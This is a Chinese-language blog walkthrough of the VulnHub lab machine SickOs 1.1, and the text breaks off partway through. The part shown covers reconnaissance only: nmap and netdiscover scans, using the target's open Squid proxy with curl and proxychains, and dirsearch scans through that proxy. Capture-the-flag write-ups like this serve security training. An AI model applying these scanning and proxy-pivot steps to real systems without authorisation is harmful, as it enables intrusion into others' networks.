<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="VulnHub - SickOs: 1.1">
<meta property="og:url" content="https://z9m8r8.github.io/2024/10/19/SickOs%201.1/index.html">
<meta property="og:site_name" content="z9m8r8&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-10-18T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-13T12:06:21.498Z">
<meta property="article:author" content="z9m8r8">
<meta property="article:tag" content="Vulnhub">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="反弹 shell">
<meta property="article:tag" content="Insecure File Upload">
<meta property="article:tag" content="Crontab">
<meta property="article:tag" content="Dirty COW">
<meta property="article:tag" content="MySQL &amp; Getshell">
<meta property="article:tag" content="3128 &amp; Squid">
<meta property="article:tag" content="CGI">
<meta property="article:tag" content="Shellshock">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/10/19/SickOs%201.1/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/10/19/SickOs%201.1/","path":"2024/10/19/SickOs 1.1/","title":"VulnHub - SickOs: 1.1"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>VulnHub - SickOs: 1.1 | z9m8r8's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">z9m8r8's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#squid"><span class="nav-text">1.3. 3128 - Squid</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-proxy"><span class="nav-text">1.3.1. Web Proxy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap-proxified"><span class="nav-text">1.3.2. Nmap proxified</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.4. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">3.1. 定时任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cgi---shell"><span class="nav-text">3.2. CGI - Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sickos-%E7%94%A8%E6%88%B7"><span class="nav-text">3.3. SickOs 用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-%E6%8F%90%E6%9D%83%E6%8E%A2%E8%AE%A8"><span class="nav-text">3.4. MySQL 提权探讨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dirtycow-%E6%8F%90%E6%9D%83"><span class="nav-text">3.5. DirtyCow 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">4. 参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="z9m8r8"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">z9m8r8</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">186</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">179</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/10/19/SickOs%201.1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="z9m8r8">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="z9m8r8's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="VulnHub - SickOs: 1.1 | z9m8r8's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          VulnHub - SickOs: 1.1
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-10-19 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-19T00:00:00+08:00">2024-10-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-12-13 20:06:21" itemprop="dateModified" datetime="2024-12-13T20:06:21+08:00">2024-12-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>6.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>23 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs:
1.1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.23</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.159.23  -p-</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 02:34 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.23</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">3128/tcp open   http-proxy Squid http proxy 3.1.19</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">MAC Address: 00:0C:29:E0:19:38 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 128.70 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="squid">1.3. 3128 - Squid</h3>
<ul>
<li><a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/network-services-pentesting/3128-pentesting-squid">3128
- Pentesting Squid | HackTricks</a></li>
</ul>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Squid_(software)">维基百科</a>：</p>
<p><strong>Squid</strong> 是一个缓存和转发的 HTTP
网络代理。它有多种用途，包括通过缓存重复请求来加速 Web
服务器，为共享网络资源的一组人缓存 Web、DNS
和其他计算机网络查找，以及通过过滤流量来帮助安全性。虽然主要用于 HTTP 和
FTP，Squid 还有限度支持其他几种协议，包括 Internet Gopher、SSL、TLS 和
HTTPS。与 Privoxy 不同，Squid 不支持 SOCKS 协议，但可以与 Privoxy
一起使用以提供 SOCKS 支持。</p>
</blockquote>
<p><strong>默认端口：</strong> 3128</p>
<h4 id="web-proxy">1.3.1. Web Proxy</h4>
<p>您可以尝试在浏览器中将此发现的服务设置为代理。但是，如果它配置了HTTP身份验证，您将被提示输入用户名和密码。</p>
<p>Copy</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Try to proxify curl</span></span><br><span class="line">curl --proxy http://10.10.11.131:3128 http://10.10.11.131</span><br></pre></td></tr></table></figure>
<h4 id="nmap-proxified">1.3.2. Nmap proxified</h4>
<p>您还可以尝试利用代理来<strong>扫描内部端口以代理nmap</strong>。</p>
<p>通过在proxichains.conf文件末尾添加以下行来配置proxychains以使用squid代理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http 10.10.10.10 3128</span><br></pre></td></tr></table></figure>
<p>对于需要身份验证的代理，通过在末尾包含用户名和密码将凭据附加到配置中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http 10.10.10.10 3128 username passw0rd</span><br></pre></td></tr></table></figure>
<p>然后使用proxychains运行nmap以<strong>从本地扫描主机</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -n -p- localhost</span><br></pre></td></tr></table></figure>
<p>测试代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># curl --proxy http://192.168.159.23:3128 http://192.168.159.23 -v</span></span><br><span class="line">*   Trying 192.168.159.23:3128...</span><br><span class="line">* Connected to 192.168.159.23 (192.168.159.23) port 3128</span><br><span class="line">&gt; GET http://192.168.159.23/ HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.159.23</span><br><span class="line">&gt; User-Agent: curl/8.5.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Proxy-Connection: Keep-Alive</span><br><span class="line">&gt; </span><br><span class="line">* HTTP 1.0, assume close after body</span><br><span class="line">&lt; HTTP/1.0 200 OK</span><br><span class="line">&lt; Date: Fri, 18 Oct 2024 14:49:45 GMT</span><br><span class="line">&lt; Server: Apache/2.2.22 (Ubuntu)</span><br><span class="line">&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 21</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; X-Cache: MISS from localhost</span><br><span class="line">&lt; X-Cache-Lookup: MISS from localhost:3128</span><br><span class="line">&lt; Via: 1.0 localhost (squid/3.1.19)</span><br><span class="line">* HTTP/1.0 connection <span class="built_in">set</span> to keep alive</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; </span><br><span class="line">&lt;h1&gt;</span><br><span class="line">BLEHHH!!!</span><br><span class="line">&lt;/h1&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 192.168.159.23 left intact</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.4. Web 信息收集</h3>
<p>挂代理，web 扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &#x27;http://192.168.159.23/&#x27; --proxy=192.168.159.23:3128 </span></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line">                                                                                                                                                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_192.168.159.23/__24-10-18_02-53-56.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.23/</span><br><span class="line"></span><br><span class="line">[02:53:56] Starting:                                                                                                                                                                                                                                                              </span><br><span class="line">[02:53:59] 403 -  245B  - /.ht_wsr.txt                                      </span><br><span class="line">[02:53:59] 403 -  244B  - /.htaccess.bak1                                   </span><br><span class="line">[02:53:59] 403 -  244B  - /.htaccess.orig                                   </span><br><span class="line">[02:53:59] 403 -  245B  - /.htaccess.sample</span><br><span class="line">[02:53:59] 403 -  243B  - /.htaccess.save                                   </span><br><span class="line">[02:53:59] 403 -  245B  - /.htaccess_extra</span><br><span class="line">[02:53:59] 403 -  245B  - /.htaccess_orig</span><br><span class="line">[02:53:59] 403 -  243B  - /.htaccessBAK</span><br><span class="line">[02:53:59] 403 -  242B  - /.htaccessOLD</span><br><span class="line">[02:53:59] 403 -  243B  - /.htaccessOLD2                                    </span><br><span class="line">[02:53:59] 403 -  243B  - /.htaccess_sc</span><br><span class="line">[02:53:59] 403 -  239B  - /.html                                            </span><br><span class="line">[02:53:59] 403 -  239B  - /.htm</span><br><span class="line">[02:53:59] 403 -  246B  - /.htpasswd_test                                   </span><br><span class="line">[02:53:59] 403 -  243B  - /.httr-oauth                                      </span><br><span class="line">[02:53:59] 403 -  242B  - /.htpasswds</span><br><span class="line">[02:54:28] 403 -  242B  - /cgi-bin/                                         </span><br><span class="line">[02:54:31] 200 -  109B  - /connect                                          </span><br><span class="line">[02:54:35] 403 -  241B  - /doc/api/                                         </span><br><span class="line">[02:54:35] 403 -  239B  - /doc/</span><br><span class="line">[02:54:35] 403 -  247B  - /doc/html/index.html</span><br><span class="line">[02:54:35] 403 -  246B  - /doc/stable.version                               </span><br><span class="line">[02:54:35] 403 -  248B  - /doc/en/changes.html                              </span><br><span class="line">[02:55:05] 200 -   58B  - /robots.txt                                       </span><br><span class="line">[02:55:07] 403 -  241B  - /server-status                                    </span><br><span class="line">[02:55:07] 403 -  242B  - /server-status/                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed                     </span><br></pre></td></tr></table></figure>
<p>根据 robots.txt 提示进一步访问 wolfcms 得</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410181545438.jpg" /></p>
<p>扫描 wolfcms 目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &#x27;http://192.168.159.23/wolfcms/&#x27; --proxy=192.168.159.23:3128 </span></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_192.168.159.23/_wolfcms__24-10-18_03-15-20.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.23/</span><br><span class="line"></span><br><span class="line">[03:15:20] Starting: wolfcms/                                                                                                                                                                                                                                                     </span><br><span class="line">[03:15:23] 403 -  252B  - /wolfcms/.ht_wsr.txt                              </span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.htaccess.bak1                           </span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.htaccess.orig</span><br><span class="line">[03:15:23] 403 -  251B  - /wolfcms/.htaccess.sample                         </span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.htaccess.save                           </span><br><span class="line">[03:15:23] 403 -  252B  - /wolfcms/.htaccess_orig</span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.htaccessBAK</span><br><span class="line">[03:15:23] 403 -  249B  - /wolfcms/.htaccess_sc</span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.htaccessOLD2</span><br><span class="line">[03:15:23] 403 -  252B  - /wolfcms/.htaccess_extra                          </span><br><span class="line">[03:15:23] 403 -  245B  - /wolfcms/.htm                                     </span><br><span class="line">[03:15:23] 403 -  249B  - /wolfcms/.htaccessOLD                             </span><br><span class="line">[03:15:23] 403 -  253B  - /wolfcms/.htpasswd_test                           </span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.httr-oauth</span><br><span class="line">[03:15:23] 403 -  245B  - /wolfcms/.html</span><br><span class="line">[03:15:23] 403 -  250B  - /wolfcms/.htpasswds</span><br><span class="line">[03:15:53] 200 -  403B  - /wolfcms/composer.json                            </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config                                   </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config.php                               </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/AppData.config                    </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/database.yml.pgsql</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/app.yml</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/apc.php</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/autoload/</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/banned_words.txt</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/aws.yml</span><br><span class="line">[03:15:53] 200 